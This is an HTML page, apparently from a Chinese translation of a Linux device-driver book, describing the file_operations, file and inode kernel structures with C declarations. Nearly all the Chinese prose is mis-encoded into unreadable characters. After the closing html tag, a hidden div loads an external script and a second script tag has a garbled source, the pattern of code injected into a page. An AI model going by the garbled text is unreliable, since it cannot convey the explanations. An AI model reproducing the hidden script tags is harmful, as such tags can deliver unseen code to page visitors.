<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>3.3.&#160;һЩҪݽṹ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch03.html" title="&#160;3&#160;&#160;ַ">
<link rel="prev" href="ch03s02.html" title="3.2.&#160;α">
<link rel="next" href="ch03s04.html" title="3.4.&#160;ַ豸ע">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">3.3.&#160;һЩҪݽṹ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch03s02.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;3&#160;&#160;ַ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch03s04.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="SomeImportantDataStructures.sect"></a>3.3.&#160;һЩҪݽṹ</h2></div></div></div>
<p>ͬ, ע豸Žееĵһ. ǽܿ쿴Ҫ, Ҫ漰һ. 󲿷ֵĻԵ 3 Ҫںݽṹ, Ϊ file_operations, file,  inode. ҪЩṹĻ˽ܹȤ, ڽʵֻϸ֮ǰ, ٲ鿴ÿһ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="FileOperation.sect"></a>3.3.1.&#160;ļ</h3></div></div></div>
<p>, ѾһЩ豸Ÿʹ, ǻûκ豸Щ. file_operation ṹһַν. ṹ,  &lt;linux/fs.h&gt;, һָļ. ÿļ(ڲһ file ṹ, Ժǻ鿴)ĺ( ͨһΪ f_op ĳԱ, ָһ file_operations ṹ). Щ󲿷ָʵϵͳ, , Ϊ open, read, ȵ. ǿΪļһ""ϵĺΪ"", ʹ̵ʾһĶ.  Linux ںпĵһ̵, ǻῴ.</p>
<p>ͳ, һ file_operation ṹһָΪ fops( һЩ). ṹеÿԱָеĺ, ЩʵһرĲ, ߶ڲֵ֧ĲΪ NULL. ָΪ NULL ָʱں˵ȷеΪÿͬ, ͬںбʾ.</p>
<p>бһӦóܹ豸ϵõв. Ѿͼб, Ϊһο, ֻܽÿ NULL ָʹʱȱʡںΪ.</p>
<p>ͨ file_operations бʱ, ע⵽ٲִ __user. עһĵʽ, ע, һָһֱܱӽõûռַ. ı, __user ûЧ, ɱⲿʹҳûռַĴʹ.</p>
<p>ʣµĲ, һЩҪݽṹ, ҪĽɫҸʾ, ʵ. Ƴ۸ӵĲ½, Ϊǻ׼ڴ, , 첽֪ͨ.</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>struct module *owner</span></span></dt>
<dd><p>һ file_operations Աһ; һָӵṹģָ. ԱĲڱʹʱֹģ鱻ж. ʱ, 򵥳ʼΪ THIS_MODULE, һ &lt;linux/module.h&gt; жĺ.</p></dd>
<dt><span class="term"><span>loff_t (*llseek) (struct file *, loff_t, int);</span></span></dt>
<dd><p>llseek ıļеĵǰ/дλ, λΪ()ֵ. loff_t һ"long offset", Ҿ 32λƽ̨Ҳ 64 λ. һֵָʾ. ָ NULL, seek ûǱڵ޷Ԥ֪ķʽ޸ file ṹеλü( "file ṹ" һ).</p></dd>
<dt><span class="term"><span>ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);</span></span></dt>
<dd><p>豸лȡ. λõһָ뵼 read ϵͳ -EINVAL("Invalid argument") ʧ. һǸֵ˳ɹȡֽ( ֵһ "signed size" , Ŀƽ̨ص).</p></dd>
<dt><span class="term"><span>ssize_t (*aio_read)(struct kiocb *, char __user *, size_t, loff_t);</span></span></dt>
<dd><p>ʼһ첽 -- ںǰĶ.  NULL, еĲ read (ͬ).</p></dd>
<dt><span class="term"><span>ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);</span></span></dt>
<dd><p>ݸ豸.  NULL, -EINVAL ظ write ϵͳõĳ. Ǹ, ֵɹдֽ.</p></dd>
<dt><span class="term"><span>ssize_t (*aio_write)(struct kiocb *, const char __user *, size_t, loff_t *);</span></span></dt>
<dd><p>ʼ豸ϵһ첽д.</p></dd>
<dt><span class="term"><span>int (*readdir) (struct file *, void *, filldir_t);</span></span></dt>
<dd><p>豸ļԱӦΪ NULL; ȡĿ¼, ҽļϵͳ.</p></dd>
<dt><span class="term"><span>unsigned int (*poll) (struct file *, struct poll_table_struct *);</span></span></dt>
<dd><p>poll  3 ϵͳõĺ: poll, epoll,  select, ѯһļĶдǷ. poll ӦһλָʾǷĶдǿܵ, , ܵ, ṩںϢʹý˯ֱ I/O Ϊ. һ poll Ϊ NULL, 豸ٶΪؿɶд.</p></dd>
<dt><span class="term"><span>int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);</span></span></dt>
<dd><p>ioctl ϵͳṩ˷豸ضķ(ʽ̵һŵ, ⲻǶҲд). ,  ioctl ںʶ fops . 豸ṩ ioctl , κδȶ(-ENOTTY, "豸 ioctl"), ϵͳ÷һ. </p></dd>
<dt><span class="term"><span>int (*mmap) (struct file *, struct vm_area_struct *);</span></span></dt>
<dd><p>mmap 豸ڴӳ䵽̵ĵַռ.  NULL, mmap ϵͳ÷ -ENODEV.</p></dd>
<dt><span class="term"><span>int (*open) (struct inode *, struct file *);</span></span></dt>
<dd><p>ⳣǶ豸ļеĵһ, ҪһӦķ.  NULL, 豸һֱɹ, õ֪ͨ.</p></dd>
<dt><span class="term"><span>int (*flush) (struct file *);</span></span></dt>
<dd><p>flush ڽ̹ر豸ļĿʱ; Ӧִ(ҵȴ)豸κδɵĲ. 벻Ҫûѯ fsync . ǰ, flush ںʹ; SCSI Ŵʹ, , Ϊȷд豸رǰдŴ.  flush Ϊ NULL, ں˼򵥵غûӦó.</p></dd>
<dt><span class="term"><span>int (*release) (struct inode *, struct file *);</span></span></dt>
<dd><p>ļṹͷʱ. ͬ open, release Ϊ NULL.</p></dd>
<dt><span class="term"><span>int (*fsync) (struct file *, struct dentry *, int);</span></span></dt>
<dd><p> fsync ϵͳõĺ, ûˢκιŵ. ָ NULL, ϵͳ÷ -EINVAL.</p></dd>
<dt><span class="term"><span>int (*aio_fsync)(struct kiocb *, int);</span></span></dt>
<dd><p> fsync 첽汾.</p></dd>
<dt><span class="term"><span>int (*fasync) (int, struct file *, int);</span></span></dt>
<dd><p>֪ͨ豸 FASYNC ־ĸı. 첽֪ͨһ߼, ڵ 6 . ԱNULL ֧첽֪ͨ.</p></dd>
<dt><span class="term"><span>int (*lock) (struct file *, int, struct file_lock *);</span></span></dt>
<dd><p>lock ʵļ; ԳļǱزٵ, 豸Ӳʵ.</p></dd>
<dt><span class="term"><span>ssize_t (*readv) (struct file *, const struct iovec *, unsigned long, loff_t *);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>ssize_t (*writev) (struct file *, const struct iovec *, unsigned long, loff_t *);</span></span></dt>
<dd><p>Щʵַɢ/۶д. ӦóżҪһڴĵд; Щϵͳضݽж⿽. ЩָΪ NULL, read  write ( ܶһ ).</p></dd>
<dt><span class="term"><span>ssize_t (*sendfile)(struct file *, loff_t *, size_t, read_actor_t, void *);</span></span></dt>
<dd><p>ʵ sendfile ϵͳõĶ, ʹٵĿһļݵһ. , һҪļݵһӵ web ʹ. 豸ʹ sendfile Ϊ NULL.</p></dd>
<dt><span class="term"><span>ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);</span></span></dt>
<dd><p>sendpage  sendfile һ; ں˵, һһҳ, Ӧļ. 豸ʵϲʵ sendpage.</p></dd>
<dt><span class="term"><span>unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);</span></span></dt>
<dd><p>Ŀڽ̵ĵַռһʵλӳڵײ豸ϵڴ. ͨڴ; Ϊʹǿ豸еκεĶ. 󲿷Ϊ NULL.<sup>[<a name="id415066" href="#ftn.id415066">10</a>]</sup></p></dd>
<dt><span class="term"><span>int (*check_flags)(int)</span></span></dt>
<dd><p>ģ鴫ݸ fnctl(F_SETFL...) õı־.</p></dd>
<dt><span class="term"><span>int (*dir_notify)(struct file *, unsigned long);</span></span></dt>
<dd><p>Ӧóʹ fcntl Ŀ¼ı֪ͨʱ. ֻļϵͳ; Ҫʵ dir_notify.</p></dd>
</dl></div>
<p>scull 豸ֻʵҪ豸.  file_operations ṹ³ʼ:</p>
<pre class="programlisting">
struct file_operations scull_fops = {
 .owner =  THIS_MODULE, 
 .llseek =  scull_llseek, 
 .read =  scull_read, 
 .write =  scull_write, 
 .ioctl =  scull_ioctl, 
 .open =  scull_open, 
 .release =  scull_release,  
};  
</pre>
<p>ʹñ׼ C ʽṹʼ﷨. ﷨ѡ, Ϊʹڽṹĸı֮ӿֲ, , , ʹӽպͿɶ. ʽʼṹԱ; ĳ, ʵѾʵ, ͨžʹõĳԱָͬӲٴ洢.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ThefileStructure.sect"></a>3.3.2.&#160;ļṹ</h3></div></div></div>
<p>struct file,  &lt;linux/fs.h&gt;, 豸еڶҪݽṹ. ע file ûռ FILE ָûκιϵ. һ FILE  C , Ӳں˴. һ struct file, һ, һں˽ṹ, Ӳû.</p>
<p>ļṹһ򿪵ļ. (ض豸; ϵͳÿ򿪵ļһ struct file ں˿ռ). ں open ʱ, ݸļϲκκ, ֱĹر. ļʵرպ, ںͷݽṹ.</p>
<p>ںԴ, struct file ָ볣Ϊ file  filp("file pointer"). ǽһֱָΪ filp Աͽṹ. , file ָǽṹ,  filp ǽṹָ.</p>
<p>struct file ҪԱչʾ. ͬǰһ, һĶб. , ڱº, һЩʵ C ʱ, ǽϸЩԱ.</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>mode_t f_mode;</span></span></dt>
<dd><p>ļģʽȷļǿɶĻǿд(߶), ͨλ FMODE_READ  FMODE_WRITE.  open  ioctl мԱĶд, 㲻Ҫд, Ϊںڵķ֮ǰ. ļûΪִȡʱдͼܾ, ֪.</p></dd>
<dt><span class="term"><span>loff_t f_pos;</span></span></dt>
<dd><p>ǰдλ. loff_t ƽ̨ 64 λ(  gcc  long long ). Զֵ, Ҫ֪ļеĵǰλ, زӦøı; дӦʹΪյָһλ, ֱ filp-&gt;f_pos. һ llseek , ĿľǸıļλ.</p></dd>
<dt><span class="term"><span>unsigned int f_flags;</span></span></dt>
<dd><p>Щļ־,  O_RDONLY, O_NONBLOCK,  O_SYNC. Ӧ O_NONBLOCK ־Ƿ( ڵһµ"ͷ"һ۷ I/O ); ־ʹ. ر, Ӧ/д, ʹ f_mode  f_flags. еı־ͷļ &lt;linux/fcntl.h&gt; ж.</p></dd>
<dt><span class="term"><span>struct file_operations *f_op;</span></span></dt>
<dd><p>ļĲ. ں˰ָΪ open ʵֵһ, ŶȡҪκεĲʱ. filp-&gt;f_op еֵӲں˱Ϊ; ζɸıļļ, 㷵ص֮·. ,  1 (/dev/null, /dev/zero, ȵ) open ݴ򿪵Ĵα filp-&gt;f_op еĲ. ʵּΪ, ͬһ¶ÿϵͳ뿪. 滻ļ̵""ں˶Ե.</p></dd>
<dt><span class="term"><span>void *private_data;</span></span></dt>
<dd><p>open ϵͳָΪ NULL, Ϊ open ֮ǰ. ʹԱߺ; ʹԱָ, ǽסںļṹ֮ǰ,  release ͷǸڴ. private_data һõԴ, ϵͳü䱣״̬Ϣ, Ǵ󲿷ģ鶼ʹ.</p></dd>
<dt><span class="term"><span>struct dentry *f_dentry;</span></span></dt>
<dd><p>ļĿ¼( dentry )ṹ. 豸дزҪ dentry ṹ, Ϊ filp-&gt;f_dentry-&gt;d_inode ȡ inode ṹ.</p></dd>
</dl></div>
<p>ʵṹж༸Ա, Ƕ豸ûô. ǿ԰ȫغЩԱ, ΪӲļṹ; ʵȡ𴦴Ľṹ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheinodeStructure.sect"></a>3.3.3.&#160;inode ṹ</h3></div></div></div>
<p>inode ṹںڲʾļ. , ʹļļṹǲͬ. дļĶļṹ, Ƕָһ inode ṹ.</p>
<p>inode ṹļϢ. ΪһͨõĹ, ṹֻ 2 Աڱд:</p>
<div class="variablelist"><dl>
<dt><span class="term">dev_t i_rdev;<span></span></span></dt>
<dd><p>ڴ豸ļĽڵ, Աʵʵ豸.</p></dd>
<dt><span class="term">struct cdev *i_cdev;<span></span></span></dt>
<dd><p>struct cdev ں˵ڲṹ, ַ豸; Աһָ, ָṹ, ڵָһַ豸ļʱ.</p></dd>
</dl></div>
<p>i_rdev  2.5 ϵиı, ƻ˴. Ϊһ̵ֲķ, ں˿Ѿ 2 , һ inode лȡα:</p>
<pre class="programlisting">
unsigned int iminor(struct inode *inode);
unsigned int imajor(struct inode *inode);
</pre>
<p>Ϊ˲ҪһθĶץס, ӦʹЩֱӲ i_rdev.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id415066" href="#id415066">10</a>] </sup>ע, release ÿν̵ close ʱ. ۺʱһļṹ(, һ fork  dup ֮), release ֱеĿر. Ҫһرʱˢ¹ŵ, Ӧʵ flush .</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch03s02.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch03.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch03s04.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">3.2.&#160;α&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;3.4.&#160;ַ豸ע</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>